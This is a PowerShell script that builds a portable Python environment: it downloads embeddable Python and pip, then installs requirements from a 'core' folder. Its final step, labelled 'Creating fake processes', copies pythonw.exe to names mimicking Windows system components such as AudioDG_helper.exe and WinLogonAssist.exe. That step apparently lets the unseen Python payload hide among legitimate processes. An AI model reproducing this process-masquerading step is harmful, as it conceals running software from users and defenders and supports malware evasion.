$ErrorActionPreference = "Stop"

$BIN_DIR = "bin"
$PYTHON_ZIP = "python-3.11.9-embed-amd64.zip"
$PYTHON_URL = "https://www.python.org/ftp/python/3.11.9/$PYTHON_ZIP"
$GET_PIP_URL = "https://bootstrap.pypa.io/get-pip.py"

Write-Host "Creating $BIN_DIR directory..."
if (Test-Path $BIN_DIR) {
    Remove-Item $BIN_DIR -Recurse -Force
}
New-Item -ItemType Directory -Path $BIN_DIR | Out-Null

Write-Host "Downloading Python Embeddable..."
Invoke-WebRequest -Uri $PYTHON_URL -OutFile $PYTHON_ZIP
Expand-Archive -Path $PYTHON_ZIP -DestinationPath $BIN_DIR -Force
Remove-Item $PYTHON_ZIP

Write-Host "Configuring python311._pth to enable import site..."
$pth_file = "$BIN_DIR\python311._pth"
$pth_content = Get-Content $pth_file
$pth_content = $pth_content -replace "#import site", "import site"
Set-Content -Path $pth_file -Value $pth_content

Write-Host "Downloading get-pip.py..."
Invoke-WebRequest -Uri $GET_PIP_URL -OutFile "$BIN_DIR\get-pip.py"

Write-Host "Installing pip..."
Start-Process -FilePath "$BIN_DIR\python.exe" -ArgumentList "$BIN_DIR\get-pip.py" -Wait -NoNewWindow
Remove-Item "$BIN_DIR\get-pip.py"

Write-Host "Installing dependencies..."
Start-Process -FilePath "$BIN_DIR\python.exe" -ArgumentList "-m pip install -r core/requirements.txt" -Wait -NoNewWindow

Write-Host "Creating fake processes..."
Copy-Item "$BIN_DIR\pythonw.exe" "$BIN_DIR\AudioDG_helper.exe"
Copy-Item "$BIN_DIR\pythonw.exe" "$BIN_DIR\SpoolerSub_helper.exe"
Copy-Item "$BIN_DIR\pythonw.exe" "$BIN_DIR\FontHost_worker.exe"
Copy-Item "$BIN_DIR\pythonw.exe" "$BIN_DIR\WinLogonAssist.exe"

Write-Host "Portable environment built successfully!"



